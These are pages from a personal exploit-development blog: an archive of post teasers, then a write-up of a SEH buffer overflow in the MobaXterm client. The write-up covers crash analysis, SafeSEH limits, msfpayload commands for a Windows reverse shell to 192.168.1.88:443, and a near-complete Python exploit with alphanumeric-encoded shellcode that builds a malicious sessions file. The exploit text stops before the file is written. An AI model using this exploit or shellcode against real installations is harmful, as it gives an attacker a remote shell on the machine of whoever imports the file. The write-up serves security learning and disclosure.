=== Content from xavibel.com_07f5fd28_20250121_024229.html ===

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security
![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)
[Skip to content](#content)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

# Author Archives: [Xavi](https://xavibel.com/author/xavi/)

[‚Üê Older posts](https://xavibel.com/author/xavi/page/2/)

## [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)

Posted on [March 17, 2024](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/ "2:51 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone! As I explained in the last blog entry, I have participated with my job teammates in a Hack the Box CTF, this is the link: https://www.hackthebox.com/events/cyber-apocalypse-2024 And this is the team that we were part of: https://ctftime.org/team/198916 This ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [binary exploitation](https://xavibel.com/tag/binary-exploitation/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [hack the box](https://xavibel.com/tag/hack-the-box/), [shellcoding](https://xavibel.com/tag/shellcoding/), [x64](https://xavibel.com/tag/x64/)
|
[Leave a comment](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/#respond)

## [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Pet Companion](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)

Posted on [March 17, 2024](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/ "11:51 am") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone! Today I want to write a couple of write-ups of a CTF that we have participated with our work colleagues from Exness. As I‚Äôm trying to improve in binary exploitation topic I would like to document here some ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [binary exploitation](https://xavibel.com/tag/binary-exploitation/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [hack the box](https://xavibel.com/tag/hack-the-box/), [shellcoding](https://xavibel.com/tag/shellcoding/), [x64](https://xavibel.com/tag/x64/)
|
[Leave a comment](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/#respond)

## [Shellcode ‚Äì Windows/x86 ‚Äì Create Administrator User ‚Äì Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)

Posted on [January 18, 2023](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/ "12:42 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone, Recently I‚Äôve been learning about Windows x86 shellcoding and I decided to write a shellcode by my own. My idea was to write a shellcode that creates a new user and make it local administrator. You can find ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [administrator](https://xavibel.com/tag/administrator/), [Assembly](https://xavibel.com/tag/assembly/), [exploit development](https://xavibel.com/tag/exploit-development/), [exploiting](https://xavibel.com/tag/exploiting/), [osed](https://xavibel.com/tag/osed/), [shellcode](https://xavibel.com/tag/shellcode/), [shellcoding](https://xavibel.com/tag/shellcoding/), [x86](https://xavibel.com/tag/x86/)
|
[Leave a comment](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/#respond)

## [Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)

Posted on [November 3, 2022](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/ "11:17 am") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Introduction Today I was reviewing one topic about AV Evasion and I was trying to understand how AMSI works and how we can interact with it. As a quick introduction, AMSI is the The Windows Antimalware Scan Interface, a interface ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)

Posted in [Uncategorized](https://xavibel.com/category/uncategorized/)
|
Tagged [AMSI](https://xavibel.com/tag/amsi/), [Assembly](https://xavibel.com/tag/assembly/), [AV](https://xavibel.com/tag/av/), [bypass](https://xavibel.com/tag/bypass/), [OSEP](https://xavibel.com/tag/osep/), [Powershell](https://xavibel.com/tag/powershell/), [WinDBG](https://xavibel.com/tag/windbg/)
|
[Leave a comment](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/#respond)

## [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)

Posted on [September 6, 2022](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/ "1:43 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone! In this blog post I would like to cover an interesting topic that is not as well known as Windows DLL Hijacking: Linux Shared Library Hijacking. Both concepts are similar but the exploitation is a bit different, I ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)

Posted in [Uncategorized](https://xavibel.com/category/uncategorized/)
|
Tagged [C](https://xavibel.com/tag/c/), [hacking](https://xavibel.com/tag/hacking/), [Linux Privilege Escalation](https://xavibel.com/tag/linux-privilege-escalation/), [OSEP](https://xavibel.com/tag/osep/), [Shared Library](https://xavibel.com/tag/shared-library/), [shellcode](https://xavibel.com/tag/shellcode/), [VIM](https://xavibel.com/tag/vim/)
|
[Leave a comment](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/#respond)

## [Protostar ‚Äì Format Strings ‚Äì Level 4](https://xavibel.com/2020/11/28/protostar-format-strings-level-3-2/)

Posted on [November 28, 2020](https://xavibel.com/2020/11/28/protostar-format-strings-level-3-2/ "7:59 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone! This is the blog post for the level 4 format level of Protostar, that is the last one. This is the hint: And this is the code: Before I start, I have to say that I had no ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2020/11/28/protostar-format-strings-level-3-2/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [Boofuzz](https://xavibel.com/tag/boofuzz/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [Format Strings](https://xavibel.com/tag/format-strings/), [Fuzzing](https://xavibel.com/tag/fuzzing/), [GOT](https://xavibel.com/tag/got/), [hacking](https://xavibel.com/tag/hacking/), [OSCE](https://xavibel.com/tag/osce/), [OSCE exam](https://xavibel.com/tag/osce-exam/), [ProtoStar](https://xavibel.com/tag/protostar/), [SEH](https://xavibel.com/tag/seh/), [shellcode](https://xavibel.com/tag/shellcode/), [x86](https://xavibel.com/tag/x86/)
|
[Leave a comment](https://xavibel.com/2020/11/28/protostar-format-strings-level-3-2/#respond)

## [Protostar ‚Äì Format Strings ‚Äì Level 3](https://xavibel.com/2020/11/22/protostar-format-strings-level-3/)

Posted on [November 22, 2020](https://xavibel.com/2020/11/22/protostar-format-strings-level-3/ "5:35 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

This is another post about Protostar exploiting box. Let‚Äôs start working in the interesting levels üôÇ This is the hint for the level: And this is the code: As the level starts as the last one, I‚Äôm going to cover ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2020/11/22/protostar-format-strings-level-3/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [Boofuzz](https://xavibel.com/tag/boofuzz/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [Format Strings](https://xavibel.com/tag/format-strings/), [Fuzzing](https://xavibel.com/tag/fuzzing/), [hacking](https://xavibel.com/tag/hacking/), [OSCE](https://xavibel.com/tag/osce/), [OSCE exam](https://xavibel.com/tag/osce-exam/), [ProtoStar](https://xavibel.com/tag/protostar/), [SEH](https://xavibel.com/tag/seh/), [shellcode](https://xavibel.com/tag/shellcode/), [x86](https://xavibel.com/tag/x86/)
|
[Leave a comment](https://xavibel.com/2020/11/22/protostar-format-strings-level-3/#respond)

## [Protostar ‚Äì Format Strings ‚Äì Level 2](https://xavibel.com/2020/11/22/protostar-format-strings-level-2/)

Posted on [November 22, 2020](https://xavibel.com/2020/11/22/protostar-format-strings-level-2/ "3:31 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone, Let‚Äôs continue working in Protostar exploit exercises üôÇ Next exercise says the following: And this is the code for this level 2: This time, the input is received in a different way: Let‚Äôs start as the past levels. ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2020/11/22/protostar-format-strings-level-2/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [Boofuzz](https://xavibel.com/tag/boofuzz/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [Format Strings](https://xavibel.com/tag/format-strings/), [Fuzzing](https://xavibel.com/tag/fuzzing/), [hacking](https://xavibel.com/tag/hacking/), [OSCE](https://xavibel.com/tag/osce/), [OSCE exam](https://xavibel.com/tag/osce-exam/), [ProtoStar](https://xavibel.com/tag/protostar/), [SEH](https://xavibel.com/tag/seh/), [shellcode](https://xavibel.com/tag/shellcode/), [x86](https://xavibel.com/tag/x86/)
|
[Leave a comment](https://xavibel.com/2020/11/22/protostar-format-strings-level-2/#respond)

## [Protostar ‚Äì Format Strings ‚Äì Level 1](https://xavibel.com/2020/11/07/protostar-format-strings-level-1/)

Posted on [November 7, 2020](https://xavibel.com/2020/11/07/protostar-format-strings-level-1/ "5:45 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Let‚Äôs continue working in ProtoStar exploiting exercises. Let‚Äôs see how to solve the Format String level 1. As always, first let‚Äôs read the level description. Exercise: This level shows how format strings can be used to modify arbitrary memory locations. ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2020/11/07/protostar-format-strings-level-1/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [Boofuzz](https://xavibel.com/tag/boofuzz/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [Format Strings](https://xavibel.com/tag/format-strings/), [Fuzzing](https://xavibel.com/tag/fuzzing/), [hacking](https://xavibel.com/tag/hacking/), [OSCE](https://xavibel.com/tag/osce/), [OSCE exam](https://xavibel.com/tag/osce-exam/), [ProtoStar](https://xavibel.com/tag/protostar/), [SEH](https://xavibel.com/tag/seh/), [shellcode](https://xavibel.com/tag/shellcode/), [x86](https://xavibel.com/tag/x86/)
|
[Leave a comment](https://xavibel.com/2020/11/07/protostar-format-strings-level-1/#respond)

## [Protostar ‚Äì Format Strings ‚Äì Level 0](https://xavibel.com/2020/11/07/protostar-format-strings/)

Posted on [November 7, 2020](https://xavibel.com/2020/11/07/protostar-format-strings/ "4:29 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone! In this blog post I will cover the solution for the Exploiting exercise named ProtoStar that is related to Format String vulnerabilities. Let‚Äôs see the first level: Exercise 0: This level introduces format strings, and how attacker supplied ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2020/11/07/protostar-format-strings/)

Posted in [Exploiting](https://xavibel.com/category/exploiting/)
|
Tagged [Assembly](https://xavibel.com/tag/assembly/), [Boofuzz](https://xavibel.com/tag/boofuzz/), [CTF](https://xavibel.com/tag/ctf/), [exploit development](https://xavibel.com/tag/exploit-development/), [Format Strings](https://xavibel.com/tag/format-strings/), [Fuzzing](https://xavibel.com/tag/fuzzing/), [hacking](https://xavibel.com/tag/hacking/), [OSCE](https://xavibel.com/tag/osce/), [OSCE exam](https://xavibel.com/tag/osce-exam/), [ProtoStar](https://xavibel.com/tag/protostar/), [SEH](https://xavibel.com/tag/seh/), [shellcode](https://xavibel.com/tag/shellcode/), [x86](https://xavibel.com/tag/x86/)
|
[Leave a comment](https://xavibel.com/2020/11/07/protostar-format-strings/#respond)

[‚Üê Older posts](https://xavibel.com/author/xavi/page/2/)

* Search for:
* ### Recent Posts

  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)
  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Pet Companion](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)
  + [Shellcode ‚Äì Windows/x86 ‚Äì Create Administrator User ‚Äì Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)
  + [Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)
  + [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)
* ### Recent Comments

  + Xavi on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-9964)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5524)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5523)
  + Xavi on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2892)
  + junsec on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2863)
* ### Archives

  + [March 2024](https://xavibel.com/2024/03/)
  + [January 2023](https://xavibel.com/2023/01/)
  + [November 2022](https://xavibel.com/2022/11/)
  + [September 2022](https://xavibel.com/2022/09/)
  + [November 2020](https://xavibel.com/2020/11/)
  + [October 2020](https://xavibel.com/2020/10/)
  + [March 2020](https://xavibel.com/2020/03/)
  + [January 2020](https://xavibel.com/2020/01/)
  + [November 2019](https://xavibel.com/2019/11/)
  + [September 2019](https://xavibel.com/2019/09/)
  + [August 2019](https://xavibel.com/2019/08/)
  + [July 2019](https://xavibel.com/2019/07/)
  + [June 2019](https://xavibel.com/2019/06/)
  + [May 2019](https://xavibel.com/2019/05/)
  + [April 2019](https://xavibel.com/2019/04/)
  + [March 2019](https://xavibel.com/2019/03/)
  + [February 2019](https://xavibel.com/2019/02/)
  + [October 2018](https://xavibel.com/2018/10/)
* ### Categories

  + [Exploiting](https://xavibel.com/category/exploiting/)
  + [Hacking Web](https://xavibel.com/category/hackingweb/)
  + [Miscellaneous](https://xavibel.com/category/miscellaneous/)
  + [Uncategorized](https://xavibel.com/category/uncategorized/)
* ### Meta

  + [Log in](https://xavibel.com/wp-login.php)
  + [Entries feed](https://xavibel.com/feed/)
  + [Comments feed](https://xavibel.com/comments/feed/)
  + [WordPress.org](https://wordpress.org/)

[Happy Hacking!](https://xavibel.com/)

[Proudly powered by WordPress.](https://wordpress.org/ "Semantic Personal Publishing Platform")



=== Content from xavibel.com_313a5490_20250121_024232.html ===

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security
![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)
[Skip to content](#content)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

[‚Üê SEH based local Buffer Overflow ‚Äì DameWare Remote Support](https://xavibel.com/2019/08/31/seh-based-local-buffer-overflow-dameware-remote-support-v-12-1-0-34/)
[Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936 ‚Üí](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/)

# MobaXterm Buffer Overflow ‚Äì Malicious Sessions File import

Posted on [September 1, 2019](https://xavibel.com/2019/09/01/mobaxterm-buffer-overflow-malicious-sessions-file-import/ "4:46 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello!

In this blog post I will talk about the exploitation of a vulnerability that I discovered on August of 2019 in MobaXterm application.

MobaXterm is a well known remote administration tool, that is used in many companies or in personal environments. It has many options and it‚Äôs really useful for managing several servers. Personally I‚Äôve been using it since 4 o 5 years ago.

The vulnerability that I detected is a SEH based Buffer Overflow. Below is a video demonstration of exploitation for proof of concept where we get a reverse shell through an import of a malicious MobaXterm sessions file:

## Exploit Development

As i said in previous blog posts, the purpose of this blog is to share a bit of knowledge with the hacking community so I‚Äôm going to explain step by step how I detected the vulnerability and how I developed the exploit.

One day I decided to play a bit with Moba, and I found that the application does not sanitize correctly the input of the parameter ‚ÄúSpecify Username‚Äù.

![](https://xavibel.com/wp-content/uploads/2019/09/injection-point.png)

If you put in that variable a buffer with at least 17000 A‚Äôs the application is going to crash overwriting some registers that can allow an attacker to gain control of the execution flow of the program.

**Important comment:**
The remote host must exist, and it has to have the port what we want to connect open. During the exploitation process of this vulnerability, the host with the IP 192.168.1.88 had a SSH running service in the port 22.

Said that, let‚Äôs start. First of all I start the SSH service of my Kali Linux and I create a new SSH session in Moba with the correct IP address of my Kali and the port 22.

I put 20000 A‚Äôs in the Username field and I double click in the session. The result is a crash in the application . We can see this in Olly:

![](https://xavibel.com/wp-content/uploads/2019/09/SEH-overwrite.png)

We let the exception occurs and this is how our registers looks like, we have control of EIP.

![](https://xavibel.com/wp-content/uploads/2019/09/eip-overwrite.png)

And at this point, the top of the stack looks like this:

![](https://xavibel.com/wp-content/uploads/2019/09/stack-looks-like.png)

So it seems a standard BOF SEH based exploitation, we need to find a POP-POP-RET instruction, but we are limited to the ASCII printable characters. We can find them here:

<https://web.itu.edu.tr/sgunduz/courses/mikroisl/ascii.html>

Basically we can use from \x32 to \xFF. I do a quick check to identify more bad characters and I also found \xA0.

I run SafeSEH plugin of Olly to check if there is any dll or the program itself compiled without SafeSEH.

The result is the following, everything is compiled with SafeSEH except our binary:

![](https://xavibel.com/wp-content/uploads/2019/09/SafeSEH-everywhere.png)

So, I can‚Äôt use any POP-POP-RET addresses of the modules that have SafeSEH protection and also I can‚Äôt use the modules that have No SEH neither.

It leads in the conclusion(partially true, we will see it later) that I can only use the addresses of the MobaXterm binary. But here I face another problem, all the memory directions of MobaXterm.exe starts with a null byte:

![](https://xavibel.com/wp-content/uploads/2019/09/binary-starts-with-null-byte.png)

I can‚Äôt use them neither. At this point, I thought that it was going to be difficult, but I still had some options.

The first one, look for a EIP overwrite instead of a SEH overwrite. I started modifying the buffer length, the injection point, but I couldn‚Äôt get a direct EIP overwrite, damn!

The second idea that I had was to do a partial overwrite of SEH, and it worked, the application crashed but instead of overwriting the first byte of SEH with a \x00 it overwrites it with a \x20‚Ä¶

The third idea that I got from reading a really interesting Corelan tutorial is to look for similar instructions outside the loaded modules. This is a good approach to bypass the SafeSEH memory protection.

I also would like to share with you a useful blog post, that speaks about this topic:

<https://www.rcesecurity.com/2012/11/bypassing-safeseh-memory-protection-in-zoner-photo-studio-v15/>

To try that, I used this Mona command:

```
!mona jseh
```

And these are the results:

![](https://xavibel.com/wp-content/uploads/2019/09/mona-jseh.png)

So these address can cover my needs, but, all of them start with the byte 06 and that is a non printable ASCII character. At this point I was a bit lost, I tried some crazy ideas, like use unicode characters, but they are converted to the value \x3F.

I‚Äôm going to read more about this topic, and I will try to bypass the SafeSEH in the future but right now SafeSEH defeated me haha üôÇ

So, what I did, is read about SafeSEH, and I saw in Wikipedia, that was implemented in Windows XP SP2, so I download a Windows XP SP1 and I installed MobaXterm. When we scan the modules with Olly SafeSEH plugin. The overview is completely different:

![](https://xavibel.com/wp-content/uploads/2019/09/xp-sp1-safeseh-no-1024x527.png)

Without SafeSEH everything was easier. I‚Äôve found a POP-POP-RET ASCII printable instruction that is in crypt32.dll:

![](https://xavibel.com/wp-content/uploads/2019/09/mona.png)

I add it to the exploit. And it‚Äôs working, we reached the desired POP-POP-RET instruction:

![](https://xavibel.com/wp-content/uploads/2019/09/pop-pop-ret-reached-1024x630.png)

We let the three instructions occur, and we are going to be in a 4 bytes space that belong to NSEH:

![](https://xavibel.com/wp-content/uploads/2019/09/nseh-1024x622.png)

I need to do a small jump, but as you see in the image above I‚Äôm not doing a normal EB jump, when I use EB there, the characters are getting mangled.

For that reason I had to do a conditional Jump that I learnt while studying OSCE certification, basically we decrease two times ESP and after we do a conditional jump below.

```
# Here we need to jump forward but EB is a bad char
# We decrease ESP and use a conditional jump after
# Learn this trick in OSCE. Thank you Muts!!! :)
nseh = ""
nseh += "\x4C"     # DEC ESP
nseh += "\x4C"     # DEC ESP
nseh += "\x77\x21" # JA SHORT 1035FE59
```

We take the jump and we are going to be at this new spot:

![](https://xavibel.com/wp-content/uploads/2019/09/recover-stack-alignment-1024x619.png)

As you can see, we jumped above some bytes, and we are a in a new spot where I execute two increment ESP instructions to recover the stack original state, remember that before we decreased the stack two times to be able to take the conditional jump.

Without increasing two times the stack, the exploit won‚Äôt work. This is probably related with stack alignment problems.

After these instructions, we reach our final shellcode that is encoded with Alpha2. Here are the commands that I used to generate the shellcode:

```
/usr/share/framework2/msfpayload win32_reverse LHOST=192.168.1.88 LPORT=443 R > reverse_tcp
/usr/share/framework2/msfencode -e Alpha2 -i reverse_tcp -t perl > encoded_rev_shell
```

At this point the exploit is completed. We execute it, import the sesssions and double click in the session‚Ä¶ And here is our shell üôÇ

![](https://xavibel.com/wp-content/uploads/2019/09/code-execution-evidence-1024x576.png)

Here is another video of the BOF execution:

And finally, here is the complete exploit:

```
#!/usr/bin/env python
# Author: Xavi Beltran
# Date: 31/8/2019
# Site: xavibel.com
# Description:
#       SEH based Buffer Overflow in the Username of a valid session
#       This exploit generates a malicious MobaXterm sessions file
#       When the user double clicks in the session the shellcode is going to be executed

# This is not the IP address of the reverse shell
# To be able to exploit the BOF you need to have a real machine with an open port that the target machine can reach
ip_address = "192.168.1.88"
port = "22"

# We are going to recreate a MobaXterm sessions file export
print ("[+] Creating the malicious MobaXterm file...")
sessions_file  = ""
sessions_file += "[Bookmarks]\n"
sessions_file += "SubRep=\n"
sessions_file += "ImgNum=42\n"
sessions_file += "pwnd=#109#0%" + ip_address + "%" + port + "%"

# Here is the SEH Based Buffer Overflow part

# [*] Exact match at offset 16672
# We have to substract 4 that corresponds to NSEH
junk1 = "A" * 16668

# Here we need to jump forward but EB is a bad char
# We decrease ESP and use a conditional jump after
# Thank you Muts!!! :)
nseh = ""
nseh += "\x4C"     # DEC ESP
nseh += "\x4C"     # DEC ESP
nseh += "\x77\x21" # JA SHORT 1035FE59

# Using a XP-SP1 so modules are compiled without SafeSEH
# !mona seh -cp asciiprint
# 0x762C5042 POP-POP-RET
seh  = "\x42\x50\x2C\x76"

# Some padding that we are going to jump over it
junk2 = "\x42" * 29

# We recover the initial state of the stack
alignment = ""
alignment += "\x44" # INC ESP
alignment += "\x44" # INC ESP

# And we reach our shellcode
# A0 is a badchar but the generated encoded shellcode won't use it
# /usr/share/framework2/msfpayload win32_reverse LHOST=192.168.1.88 LPORT=443 R > reverse_tcp
# /usr/share/framework2/msfencode -e Alpha2 -i reverse_tcp -t perl > encoded_rev_shell
# Shellcode 636 bytes
shellcode = ""
shellcode += "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x48\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x63"
shellcode += "\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x73\x41\x32\x41\x41\x32"
shellcode += "\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x4b\x59\x6b\x4c\x71"
shellcode += "\x7a\x5a\x4b\x30\x4d\x79\x78\x4c\x39\x4b\x4f\x79\x6f\x6b\x4f\x33"
shellcode += "\x50\x6c\x4b\x62\x4c\x56\x44\x77\x54\x6e\x6b\x50\x45\x55\x6c\x6e"
shellcode += "\x6b\x51\x6c\x55\x55\x54\x38\x57\x71\x5a\x4f\x4e\x6b\x52\x6f\x37"
shellcode += "\x68\x6e\x6b\x53\x6f\x51\x30\x36\x61\x38\x6b\x70\x49\x4e\x6b\x70"
shellcode += "\x34\x6e\x6b\x65\x51\x58\x6e\x47\x41\x6f\x30\x6c\x59\x4e\x4c\x4e"
shellcode += "\x64\x6f\x30\x53\x44\x36\x67\x5a\x61\x39\x5a\x64\x4d\x53\x31\x49"
shellcode += "\x52\x4a\x4b\x6b\x44\x67\x4b\x33\x64\x66\x44\x34\x68\x41\x65\x6b"
shellcode += "\x55\x4e\x6b\x73\x6f\x54\x64\x65\x51\x58\x6b\x73\x56\x6e\x6b\x54"
shellcode += "\x4c\x70\x4b\x6e\x6b\x31\x4f\x77\x6c\x33\x31\x48\x6b\x47\x73\x46"
shellcode += "\x4c\x6c\x4b\x6e\x69\x70\x6c\x55\x74\x37\x6c\x73\x51\x6f\x33\x35"
shellcode += "\x61\x4b\x6b\x62\x44\x4e\x6b\x57\x33\x36\x50\x6e\x6b\x41\x50\x76"
shellcode += "\x6c\x6c\x4b\x34\x30\x67\x6c\x4c\x6d\x4c\x4b\x33\x70\x43\x38\x61"
shellcode += "\x4e\x32\x48\x6c\x4e\x62\x6e\x34\x4e\x4a\x4c\x56\x30\x79\x6f\x58"
shellcode += "\x56\x62\x46\x51\x43\x52\x46\x70\x68\x44\x73\x45\x62\x75\x38\x42"
shellcode += "\x57\x32\x53\x75\x62\x31\x4f\x50\x54\x4b\x4f\x78\x50\x72\x48\x68"
shellcode += "\x4b\x5a\x4d\x6b\x4c\x45\x6b\x70\x50\x39\x6f\x6b\x66\x43\x6f\x6e"
shellcode += "\x69\x48\x65\x41\x76\x4f\x71\x48\x6d\x76\x68\x45\x52\x53\x65\x50"
shellcode += "\x6a\x33\x32\x4b\x4f\x6e\x30\x31\x78\x4b\x69\x73\x39\x6c\x35\x6e"
shellcode += "\x4d\x43\x67\x6b\x4f\x6e\x36\x50\x53\x41\x43\x46\x33\x51\x43\x30"
shellcode += "\x43\x36\x33\x57\x33\x42\x73\x49\x6f\x7a\x70\x70\x68\x49\x50\x6d"
shellcode += "\x78\x46\x61\x33\x68\x35\x36\x73\x58\x43\x31\x6d\x6b\x62\x46\x56"
shellcode += "\x33\x4e\x69\x69\x71\x5a\x35\x51\x78\x7a\x4c\x4c\x39\x4e\x4a\x31"
shellcode += "\x70\x36\x37\x49\x6f\x59\x46\x50\x6a\x52\x30\x70\x51\x31\x45\x6b"
shellcode += "\x4f\x5a\x70\x71\x76\x72\x4a\x62\x44\x53\x56\x73\x58\x42\x43\x50"
shellcode += "\x6d\x41\x7a\x32\x70\x42\x79\x51\x39\x38\x4c\x4c\x49\x69\x77\x71"
shellcode += "\x7a\x41\x54\x4c\x49\x6a\x42\x70\x31\x4b\x70\x4b\x43\x6f\x5a\x4d"
shellcode += "\x45\x4e\x69\x69\x6d\x39\x6e\x30\x42\x46\x4d\x59\x6e\x53\x72\x74"
shellcode += "\x6c\x4c\x4d\x73\x4a\x70\x38\x4e\x4b\x4c\x6b\x4e\x4b\x31\x78\x71"
shellcode += "\x62\x6b\x4e\x4e\x53\x76\x76\x79\x6f\x62\x55\x76\x48\x59\x6f\x4e"
shellcode += "\x36\x53\x6b\x70\x57\x71\x42\x53\x61\x66\x31\x32\x71\x72\x4a\x34"
shellcode += "\x41\x56\x31\x73\x61\x70\x55\x53\x61\x59\x6f\x7a\x70\x32\x48\x6c"
shellcode += "\x6d\x38\x59\x73\x35\x58\x4e\x41\x43\x49\x6f\x6a\x76\x43\x5a\x69"
shellcode += "\x6f\x6b\x4f\x30\x37\x59\x6f\x5a\x70\x73\x58\x6b\x57\x42\x59\x78"
shellcode += "\x46\x70\x79\x49\x6f\x73\x45\x64\x44\x59\x6f\x7a\x76\x69\x6f\x43"
shellcode += "\x47\x39\x6c\x39\x6f\x6e\x30\x45\x38\x6a\x50\x4f\x7a\x46\x64\x61"
shellcode += "\x4f\x72\x73\x6b\x4f\x58\x56\x39\x6f\x78\x50\x63"

crash = junk1 + nseh + seh + junk2 + alignment + shellcode

# We need to mantain the MobaXterm sessions file structure
sessions_file += crash
sessions_file += "%%-1%-1%%%22%%0%0%0%%%-1%0%0%0%%1080%%0%0%1#MobaFont%10%0%0%0%15%236,236,236%30,30,30%180,180,192%0%-1%0%%xterm%-1%-1%_Std_Colors_0_%80%24%0%1%-1%<none>%%0#0# #-1"

# Finally we generate the file
